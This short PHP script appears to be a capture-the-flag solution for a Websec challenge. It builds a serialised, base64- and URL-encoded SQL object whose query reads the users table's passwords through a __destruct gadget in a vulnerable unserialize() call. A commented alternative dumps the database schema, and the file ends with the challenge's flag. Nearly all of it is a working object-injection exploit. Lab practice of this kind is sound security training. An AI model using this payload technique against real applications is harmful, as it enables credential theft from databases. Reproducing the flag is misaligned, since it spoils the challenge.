<?php

class SQL {
    // public $query = 'SELECT sql AS username FROM sqlite_master WHERE type = \'table\'';
    public $query = 'SELECT password AS username FROM users';
    // public $conn;
    // public function __construct() {
    // }
    
    // public function connect() {
    //     $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    // }

    // public function SQL_query($query) {
    //     $this->query = $query;
    // }

    // public function execute() {
    //     return $this->conn->query ($this->query);
    // }

    // public function __destruct() {
    //     if (!isset ($this->conn)) {
    //         $this->connect ();
    //     }
        
    //     $ret = $this->execute ();
    //     if (false !== $ret) {    
    //         while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
    //             echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
    //         }
    //     }
    // }
}

echo urlencode(base64_encode(serialize(new SQL()))), PHP_EOL;
// WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
